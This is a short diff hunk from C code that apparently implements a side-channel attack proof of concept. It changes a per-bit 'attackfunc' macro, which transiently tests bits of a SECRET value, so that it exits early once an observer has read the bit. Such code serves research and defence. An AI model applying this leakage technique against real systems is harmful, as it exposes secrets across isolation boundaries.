@@ -49,7 +49,11 @@ static void __attribute__((noinline)) attackfunc_##bitnum(uint64_t iters) { \
   /* (otherwise gcc inserts an extra conditional branch, and suddenly thinks */ \
   /* the x=1 store is necessary again)                                       */ \
   volatile int v = 0; \
-  do { v++; } while(--iters > 0); \
+  volatile unsigned char* a_vol = &a[bitnum];  /* volatile so we keep reloading */ \
+  do { \
+    v++; \
+    if(*a_vol > 0) break; /* quit early if observer has already gotten something */ \
+  } while(--iters > 0); \
  \
   if(alwaysFalse) { \
     if(SECRET[bitnum/64] & (1ULL<<(bitnum & 63))) x = 2; \
